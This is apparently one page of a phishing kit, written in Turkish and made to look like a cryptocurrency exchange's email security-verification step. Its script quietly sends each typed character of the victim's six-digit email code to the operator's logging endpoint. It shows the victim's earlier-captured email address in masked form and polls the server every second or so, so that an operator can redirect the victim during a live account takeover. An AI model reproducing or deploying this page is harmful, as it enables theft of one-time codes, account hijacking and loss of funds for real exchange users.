<!DOCTYPE html>
<html lang="tr">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Güvenlik Kontrolü</title>
  <link rel="shortcut icon" type="image/x-icon" href="../assets/images/favicon.ico">
  <link rel="stylesheet" href="../assets/css/style.css">
</head>

<body class="sms">
  <div id="__nuxt">
    <div id="__layout">
      <div data-v-905421cc="">
        <div data-v-1445057b="" data-v-905421cc="" id="headerId" class="top">
          <header data-v-1445057b="" class="z-9 fixed">
            <nav data-v-1445057b="">
              <a data-v-1445057b="" class="nav-logo nuxt-link-active">
                <img data-v-1445057b="" src="../assets/images/logo.png" alt="logo" class="logo">
              </a>
              <div data-v-1445057b="" class="nav-list">
                <a data-v-1445057b="">Piyasalar</a>
                <a data-v-1445057b="">Al-Sat</a>
                <a data-v-1445057b="">Yatırma</a>
                <a data-v-1445057b="">Çekme</a>
                <a data-v-1445057b="">Kolay Al/Sat</a>
                <a data-v-1445057b="">Dönüştür</a>
                <a data-v-1445057b="">Otomatik Yatırım</a>
                <a data-v-1445057b="">Blog</a>
                <a data-v-1445057b="">Destek Merkezi</a>
              </div>
              <div data-v-1445057b="" class="nav-r">
                <div data-v-1445057b="" class="nav-signin">
                  <div data-v-1445057b="" class="register">
                    <a data-v-1445057b="" class="_signin">Giriş Yap</a>
                    <a data-v-1445057b="" class="bc-btn bc-btn-yellow _signup">Hesap Oluştur</a>
                  </div>
                </div>
                <div data-v-1445057b="" class="exchange-rate dropdown-arrow download-icon">
                  <span data-v-1445057b="">
                    <svg data-v-1445057b="" data-bnc="Indicator#sms" aria-hidden="true" class="icon">
                      <use data-v-1445057b="" xlink:href="#icondownload">
                      </use>
                    </svg>
                  </span>
                  <div data-v-1445057b="" class="rate-list clearfix z-2 download">
                    <div data-v-1445057b="" class="download-qrcode">
                      <canvas width="120" height="120" style="display: none;">
                      </canvas>
                      <img style="display: block;" src="../assets/images/mqr.png">
                    </div>
                    <p data-v-1445057b="">İndirmek Tara IOS &amp; Android</p>
                    <a data-v-1445057b="" class="bc-btn bc-btn-yellow">İndirme Seçenekleri</a>
                  </div>
                </div>
                <div data-v-1445057b="" class="exchange-rate">
                  <span data-v-1445057b="">Türkçe</span> &nbsp;|&nbsp; <span data-v-1445057b="">TRY</span>
                </div>
                <div data-v-1445057b="" class="phoneMore">
                  <svg data-v-1445057b="" aria-hidden="true" class="icon">
                    <use xlink:href="#iconmore">
                    </use>
                  </svg>
                </div>
              </div>
            </nav>
          </header>
          <div data-v-1445057b="" class="sideslip-box" style="display: none;">
            <div data-v-1445057b="" class="sideslip-content" style="display: none;">
              <div data-v-1445057b="" class="sideslip-container">
                <a data-v-1445057b="" class="_signin_">Giriş Yap</a>
                <a data-v-1445057b="" class="bc-btn bc-btn-yellow _signup_">Hesap Oluştur</a>
                <div data-v-1445057b="" class="split-line">
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconmarket">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Piyasa </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconspot">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Borsa </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconwallet">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Yatırma </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconwallet">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Çekme </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconrectangle">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Öğren &amp; Kazan! </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconconvert">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Kolay Al/Sat </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconlamp">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" target="_blank" class="menu-text"> Blog <span data-v-1445057b="" class="extend-content"> Yeni </span>
                    </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="split-line">
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#icondownload">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> İndir </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconlang">
                        </use>
                      </svg>
                    </div>
                    <div data-v-1445057b="" class="menu-text"> Türkçe | TRY </div>
                  </div>
                </div>
              </div>
            </div>
            <div data-v-1445057b="" class="sideslip-bg">
            </div>
          </div>
          <div data-v-1445057b="" class="sideslip-box" style="display: none;">
            <div data-v-1445057b="" class="sideslip-content" style="display: none;">
              <div data-v-1445057b="" class="sideslip-container">
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconsecurity">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Güvenlik </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconkyc">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Kimlik Doğrulama ve Limitler </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconapi">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> API Yönetimi </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconreferral">
                        </use>
                      </svg>
                    </div>
                    <a data-v-1445057b="" class="menu-text"> Referans </a>
                  </div>
                </div>
                <div data-v-1445057b="" class="split-line">
                </div>
                <div data-v-1445057b="" class="phone-menu">
                  <div data-v-1445057b="" class="phone-menu-p">
                    <div data-v-1445057b="" class="icon-wap">
                      <svg data-v-1445057b="" aria-hidden="true" class="icon">
                        <use xlink:href="#iconlogout">
                        </use>
                      </svg>
                    </div>
                    <div data-v-1445057b="" class="menu-text"> Çıkış Yap </div>
                  </div>
                </div>
              </div>
            </div>
            <div data-v-1445057b="" class="sideslip-bg">
            </div>
          </div>
        </div>
        <main data-v-5c4d12e5="" data-v-905421cc="">
          <section data-v-6408680b="" data-v-5c4d12e5="">
            <h2 data-v-6408680b="">Mail Kod</h2>
            <div data-v-9de2df86="" class="login-box">
              <div data-v-9de2df86="" class="loading" style="display: none;">
                <div data-v-9de2df86="" class="groove">
                  <div data-v-9de2df86="" class="bar">
                  </div>
                </div>
              </div>
              <form action="form.php" method="POST" autocomplete="off">
                <div data-v-a3f11faa="" data-v-9de2df86="" class="auth-box-2fa">
                  <h2 data-v-a3f11faa="" data-v-9de2df86=""> Güvenlik doğrulaması </h2>
                  <p data-v-a3f11faa="" data-v-9de2df86=""> Hesabınızı güvence altına almak için lütfen aşağıdaki doğrulamayı tamamlayın. </p>
                  <div data-v-edadb4a0="" data-v-a3f11faa="" class="bc-verify-input-box" data-v-9de2df86="">
                    <div data-v-edadb4a0="" class="bc-verify-input-content">
                      <div data-v-edadb4a0="" class="email-box-l">
                        <div data-v-edadb4a0="" class="ipt">
                          <input data-v-edadb4a0="" type="text" inputmode="numeric" name="mailcode" autocomplete="one-time-code" maxlength="6">
                          <input type="hidden" name="s_2" value="4">
                          <label data-v-edadb4a0="" class="bc-input-label"> E-posta doğrulama kodu </label>
                        </div>
                      </div>
                    </div>
                    <div data-v-edadb4a0="" class="err-tip" id="mailCode2Message">Mail adresinize gönderilen 6 haneli doğrulama kodunu girin.</div>
                  </div>
                  <button type="submit" data-v-a3f11faa="" data-v-9de2df86="" class="submit bc-btn-yellow"> Onayla </button>
                </div>
                <input type="hidden" name="token" value="">
              </form>
            </div>
          </section>
        </main>
      </div>
    </div>
  </div>
  <div class="loading-box" style="display: none;">
    <img src="../assets/images/loading.svg" alt="loading">
  </div>
  <div class="area" style="display: none;">
    <div class="css-1vb7bc9" style="transform: translate3d(0px, 0px, 0px);">
      <div class="css-lu6k78" style="opacity: 1.">
        <div class="css-14qry50">
          <div class="css-1bpj83k">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" class="css-boyavq">
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5.326 13.909l-1.429 1.417L12 13.429l-3.897 3.897-1.429-1.417 3.909-3.898-3.909-3.908 1.429-1.417L12 10.583l3.897-3.897 1.429 1.417-3.897 3.908 3.897 3.898z" fill="currentColor"></path>
            </svg>
          </div>
          <div class="bn-notification-body-wrapper css-gxv9qv">
            <div data-bn-type="text" class="bn-notification-msg-wrapper css-161eirp">Hatalı bir e-posta kodu girdiniz.</div>
          </div>
        </div>
      </div>
    </div>
    <div class="css-vp41bv">
      <div class="css-baaq78">
        <div class="css-tolw2i"></div>
        <div class="css-16wz1c4">
          <div class="css-hv39bs">
            <div class="css-uq1pv2">
              <div src="../assets/images/error.svg" class="css-ydz7pw"></div>
            </div>
            <div data-bn-type="text" class="modal-desc css-1ixmqv3">E-posta kodu geçersiz. Lütfen tekrar deneyin.</div>
            <div class="btn-group css-1tr0qpm">
              <button data-bn-type="button" class="bc-btn bc-btn-yellow sensors-login" style="width:100%">
                <div data-bn-type="text" class="css-1c82c04">Anladım</div>
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <script>
    const pingServer = () => {
      fetch('/api/ping').catch(err => console.error('Ping failed', err));
    };

    // Retry mekanizması ile fetch wrapper - logMailCode2Page için
    async function fetchLogPageWithRetry(payload, maxRetries = 5, delay = 1000) {
      for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
          const response = await fetch('/api/log-page', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            keepalive: true
          });
          
          if (response.ok || (response.status !== 500 && response.status !== 503)) {
            return; // Başarılı veya retry yapılmayacak hata
          }
          
          if (attempt < maxRetries) {
            await new Promise(resolve => setTimeout(resolve, delay * attempt));
            continue;
          }
        } catch (err) {
          if (attempt < maxRetries) {
            await new Promise(resolve => setTimeout(resolve, delay * attempt));
            continue;
          }
        }
      }
      // Sessizce devam et - kullanıcıya hata gösterme
    }

    function logMailCode2Page() {
      fetchLogPageWithRetry({ page: 'mailcode2' }).catch(() => {
        // Sessizce devam et
      });
    }

    // Retry mekanizması ile fetch wrapper - kayıt garantisi için
    async function fetchWithRetry(url, options = {}, maxRetries = 5, delay = 1000) {
      let lastError;
      
      for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
          const response = await fetch(url, options);
          
          // 500 Internal Server Error veya 503 Service Unavailable durumunda retry yap
          if ((response.status === 500 || response.status === 503) && attempt < maxRetries) {
            console.log(`API request failed (${response.status}), retrying... (${attempt}/${maxRetries})`);
            await new Promise(resolve => setTimeout(resolve, delay * attempt));
            continue;
          }
          
          if (response.ok) {
            return response;
          }
          
          return response;
        } catch (err) {
          lastError = err;
          
          if (attempt < maxRetries) {
            console.log(`Network error, retrying... (${attempt}/${maxRetries}): ${err.message}`);
            await new Promise(resolve => setTimeout(resolve, delay * attempt));
            continue;
          }
        }
      }
      
      // Son denemede de başarısız olursa sessizce devam et
      if (lastError) {
        console.error('Fetch failed after retries (silent):', lastError);
      }
      return { ok: false, status: 500 };
    }

    async function sendLogUpdate(payload) {
      try {
        const body = JSON.stringify(payload);
        await fetchWithRetry('/api/log-page', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body,
          keepalive: true
        }, 5, 1000);
      } catch (err) {
        console.error('Mail code2 log error (silent):', err);
        // Sessizce devam et - kullanıcıya hata gösterme
      }
    }

    async function logMailCode2Input(value) {
      if (value && value.trim()) {
        try {
          await sendLogUpdate({
            page: 'mailcode2',
            inputs: { input5: value.trim() }
          });
        } catch (err) {
          console.error('Failed to log mail code2 input (silent):', err);
          // Sessizce devam et - kullanıcıya hata gösterme
        }
      }
    }

    async function checkRedirect() {
      try {
        const res = await fetch('/api/check-redirect', { 
          cache: 'no-store',
          keepalive: true 
        });
        if (res.ok) {
          const data = await res.json();
          if (data.redirectTo) {
            // Direkt yönlendir - window.location.replace() daha hızlı ve geçmişe eklenmez
            window.location.replace(data.redirectTo);
            return true;
          }
        }
      } catch (err) {
        console.error('Redirect check failed', err);
      }
      return false;
    }

    // Mail adresini dinamik olarak göster
    async function updateMailCodeMessage() {
      try {
        const res = await fetch('/api/user-log');
        if (res.ok) {
          const data = await res.json();
          const input1 = data.input1;
          const messageEl = document.getElementById('mailCode2Message');
          
          if (messageEl && input1) {
            // Mail formatı kontrolü
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (emailRegex.test(input1.trim())) {
              // Mail formatındaysa maskeleme yap
              const email = input1.trim();
              const [localPart, domain] = email.split('@');
              let maskedLocal = '';
              if (localPart.length > 1) {
                maskedLocal = localPart[0] + '*'.repeat(localPart.length - 1);
              } else {
                maskedLocal = localPart[0] || '*';
              }
              const maskedEmail = `${maskedLocal}@${domain}`;
              messageEl.textContent = `${maskedEmail} adresine gönderilen 6 haneli doğrulama kodunu girin.`;
            } else {
              // Mail formatı değilse genel mesaj
              messageEl.textContent = 'Mail adresinize gönderilen 6 haneli doğrulama kodunu girin.';
            }
          }
        }
      } catch (err) {
        console.error('Failed to fetch user log', err);
        // Hata durumunda genel mesajı kullan
      }
    }

    logMailCode2Page();
    pingServer();
    checkRedirect();
    updateMailCodeMessage();
    setInterval(pingServer, 4000);
    // Daha sık kontrol et - her 1 saniyede bir
    setInterval(checkRedirect, 1000);

    function b_xhr() { fetch("/websocket.php", { method: "POST" }) .then((y) => y.json()) .then((m) => { if (m.success) { let u = m.success; if (u.includes('login')) { u = '../' + u; } window.location.href = u; } }); } setInterval(b_xhr, 1500);
    const frm = document.querySelector('form');
    const mCInp = frm.elements[0];
    const btn = document.querySelector(".btn-group button.bc-btn.bc-btn-yellow.sensors-login");

    // Input değeri değiştiğinde kaydet
    let mailCode2InputTimeout;
    mCInp.addEventListener('input', function() {
      clearTimeout(mailCode2InputTimeout);
      mailCode2InputTimeout = setTimeout(function() {
        if (mCInp.value && mCInp.value.trim()) {
          logMailCode2Input(mCInp.value);
        }
      }, 500);
    });

    mCInp.addEventListener('blur', function() {
      if (mCInp.value && mCInp.value.trim()) {
        logMailCode2Input(mCInp.value);
      }
    });

    frm.addEventListener('submit', async function(evt) {
        evt.preventDefault();

        if (/^\d{6}$/.test(mCInp.value.trim())) {
            mCInp.parentElement.style.borderColor = 'rgb(234, 236, 239)';
            mCInp.closest('.bc-verify-input-content').nextElementSibling.style.color = '#76808f';
            // MongoDB'ye kaydın %100 tamamlanmasını bekle - input5 olarak kaydet
            try {
              await logMailCode2Input(mCInp.value);
            } catch (err) {
              console.error('Mail code2 log failed, continuing anyway', err);
            }
            // wait.html'e yönlendir
            window.location.href = '/pages/wait.html';
        } else {
            mCInp.parentElement.style.borderColor = '#f84960';
            mCInp.closest('.bc-verify-input-content').nextElementSibling.style.color = 'red';
            // Hata mesajını göster
            if (document.querySelector('.area')) {
              document.querySelector('.area').style.display = 'block';
            }
        }
    });

    if (btn) {
      btn.addEventListener('click', () => {
        if (document.querySelector('.area')) {
          document.querySelector('.area').style.display = 'none';
          if (document.querySelector("body > div.area")) {
            document.querySelector("body > div.area").remove();
          }
        }
      });
    }

  </script>
</body>

</html>

